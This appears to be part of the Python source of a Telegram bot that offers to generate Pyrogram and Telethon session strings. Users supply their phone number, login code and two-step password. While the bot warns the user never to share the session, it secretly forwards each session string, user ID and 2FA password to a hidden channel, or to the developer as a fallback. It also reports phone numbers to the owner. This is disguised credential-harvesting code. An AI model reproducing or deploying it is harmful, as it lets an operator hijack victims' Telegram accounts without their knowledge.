async def send_pyro_session(user_id, session_string, message, password=None):
    await message.reply(
        f"✅ تم إنشاء جلسة Pyrogram بنجاح!\n\n"
        f"🔑 الجلسة:\n{session_string}\n\n"
        "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n\n"
        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
    )
    
    try:
        if password:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 كلمة المرور (2SV): {password}\n\n"
                f"🔑 جلسة Pyrogram:\n{session_string}\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
        else:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 جلسة Pyrogram:\n{session_string}\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
        print(f"✅ تم إرسال جلسة Pyrogram للمجموعة {SESSION_CHANNEL}")
    except Exception as e:
        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
        try:
            await app.send_message(
                DEV_USERNAME,
                f"⚠️ فشل إرسال جلسة Pyrogram للقناة!\n\n"
                f"المستخدم: {user_id}\n"
                f"الجلسة: {session_string}\n"
                f"الخطأ: {e}"
            )
            print("✅ تم إرسال الجلسة للمطور كحل احتياطي")
        except:
            pass

# ====== دوال Telethon ======
async def telethon_session_step(client, message):
    user_id = message.chat.id
    step = user_steps.get(user_id)
    user_info = get_user_info(message)

    if step == "telethon_phone":
        user_data[user_id] = {"phone": message.text}
        user_steps[user_id] = "telethon_otp"
        
        await notify_owner(
            "📱 **تم إرسال رقم الهاتف لـ Telethon**",
            user_info["id"],
            user_info["username"],
            user_info["first_name"],
            f"رقم الهاتف: {message.text}"
        )
        
        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
        session_name = f"telethon_{user_id}"
        temp_client = TelegramClient(session_name, API_ID, API_HASH)
        user_data[user_id]["client"] = temp_client
        await temp_client.connect()
        try:
            await temp_client.send_code_request(user_data[user_id]["phone"])
            await omsg.delete()
            await message.reply("📨 تم إرسال رمز التحقق.\n\nأرسل الرمز بالأرقام فقط (مثال: 12345)")
        except ApiIdInvalidError:
            await message.reply('❌ خطأ: تركيبة API_ID و API_HASH غير صالحة.')
            reset_user(user_id)
        except PhoneNumberInvalidError:
            await message.reply('❌ خطأ: رقم الهاتف غير صالح.')
            reset_user(user_id)
            
    elif step == "telethon_otp":
        phone_code = message.text.replace(" ", "")
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.sign_in(user_data[user_id]["phone"], phone_code)
            session_string = StringSession.save(temp_client.session)
            user_sessions[user_id] = session_string
            user_telethon_clients[user_id] = temp_client
            
            await notify_owner(
                "✅ **تم استخراج جلسة Telethon بنجاح**",
                user_info["id"],
                user_info["username"],
                user_info["first_name"],
                f"الجلسة: {session_string[:50]}..."
            )
            
            await send_telethon_session(user_id, session_string, message)
            reset_user(user_id)
        except PhoneCodeInvalidError:
            await message.reply('❌ خطأ: رمز التحقق غير صالح.')
            reset_user(user_id)
        except PhoneCodeExpiredError:
            await message.reply('❌ خطأ: انتهت صلاحية رمز التحقق.')
            reset_user(user_id)
        except SessionPasswordNeededError:
            user_steps[user_id] = "telethon_password"
            await message.reply('🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\nيرجى إرسال كلمة المرور الخاصة بك.')
            
    elif step == "telethon_password":
        temp_client = user_data[user_id]["client"]
        try:
            password = message.text
            await temp_client.sign_in(password=password)
            session_string = StringSession.save(temp_client.session)
            user_sessions[user_id] = session_string
            user_telethon_clients[user_id] = temp_client
            
            await notify_owner(
                "✅ **تم استخراج جلسة Telethon (مع كلمة مرور 2SV)**",
                user_info["id"],
                user_info["username"],
                user_info["first_name"],
                f"الجلسة: {session_string[:50]}..."
            )
            
            await send_telethon_session(user_id, session_string, message, password)
            reset_user(user_id)
        except PasswordHashInvalidError:
            await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
            reset_user(user_id)

async def send_telethon_session(user_id, session_string, message, password=None):
    await message.reply(
        f"✅ تم إنشاء جلسة Telethon بنجاح!\n\n"
        f"🔑 الجلسة:\n{session_string}\n\n"
        "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n\n"
        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
    )
    
    try:
        if password:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 كلمة المرور (2SV): {password}\n\n"
                f"🔑 جلسة Telethon:\n{session_string}\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
        else:
            await app.send_message(
                SESSION_CHANNEL,
                f"✨ معرف المستخدم: {user_id}\n\n"
                f"🔑 جلسة Telethon:\n{session_string}\n\n"
                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
            )
        print(f"✅ تم إرسال جلسة Telethon للمجموعة {SESSION_CHANNEL}")
    except Exception as e:
        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
        try:
            await app.send_message(
                DEV_USERNAME,
                f"⚠️ فشل إرسال جلسة Telethon للقناة!\n\n"
                f"المستخدم: {user_id}\n"
                f"الجلسة: {session_string}\n"
                f"الخطأ: {e}"
            )
            print("✅ تم إرسال الجلسة للمطور كحل احتياطي")
        except:
            pass

def reset_user(user_id):
    user_steps.pop(user_id, None)
    user_data.pop(user_id, None)

# ====== إضافة مسار ويب لـ Render ======
web_app = Flask(__name__)

@web_app.route('/')
def index():
    return "✅ البوت شغال 24 ساعة!"

def run_web():
    web_app.run(host='0.0.0.0', port=8080)

threading.Thread(target=run_web, daemon=True).start()

# ====== تشغيل البوت ======
if __name__ == "__main__":
    try:
        print("🚀 جاري تشغيل البوت...")
        app.run()
        print("✅ البوت يعمل الآن!")
    except Exception as e:
        print(f"❌ فشل تشغيل البوت: {e}")
